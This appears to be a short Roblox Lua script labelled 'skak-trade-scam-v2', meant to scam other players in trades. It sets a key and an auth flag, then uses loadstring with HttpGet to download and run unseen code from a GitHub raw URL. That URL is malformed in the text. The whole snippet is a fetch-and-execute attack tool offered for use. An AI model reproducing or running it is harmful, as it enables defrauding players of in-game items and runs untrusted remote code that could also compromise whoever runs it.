# skak-trade-scam-v2
_G.Key = "kaks"

_G.AuthServer = "true"

loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua%22))()
